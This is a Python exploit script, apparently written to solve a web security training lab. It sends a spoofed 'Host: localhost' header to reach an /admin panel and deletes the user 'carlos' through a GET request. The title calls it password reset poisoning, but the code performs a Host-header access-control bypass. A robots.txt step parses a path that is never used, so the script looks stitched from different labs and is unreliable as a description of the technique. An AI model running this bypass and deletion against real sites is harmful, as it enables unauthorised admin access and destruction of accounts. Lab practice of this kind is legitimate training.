# Basic password reset poisoning

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_path(s, url):
	robots_path = '/robots.txt'
	print('\n[+] Navigating to:\t%s' % robots_path)
	r = s.get(url + robots_path)
	time.sleep(1)
	print(r.text)
	backup_path = r.text.encode().split(b'\n')[1].split(b' ')[1].decode()
	print('\n[+] Navigating to:\t%s' % backup_path)

def find_admin_panel(s, url):
	print('\n[+] Trying to access to the Admin Panel...')
	admin_path = url + '/admin'
	r = s.get(admin_path)
	time.sleep(1)
	response = re.search(rb"</header>\n                    (.*)\n                </div>", r.text.encode()).group(1).decode().strip()
	print('[+] Server response:')
	print(response)

def delete_carlos(s, url):
	print('\n[+] Trying to access to the Admin Panel as local User...')
	admin_path = url + '/admin'
	headers = {'Host': 'localhost'}
	print('[+] Using Header:\t%s' % headers)
	r = s.get(admin_path, headers=headers)
	time.sleep(1)
	delete_path = url + '/admin/delete?username=carlos'
	if r.status_code == 200:
		print('\n[+] Trying to delete Carlos user...')
		r = s.get(delete_path, headers=headers)


def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Basic password reset poisoning')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			get_path(s, url)
			find_admin_panel(s, url)
			delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
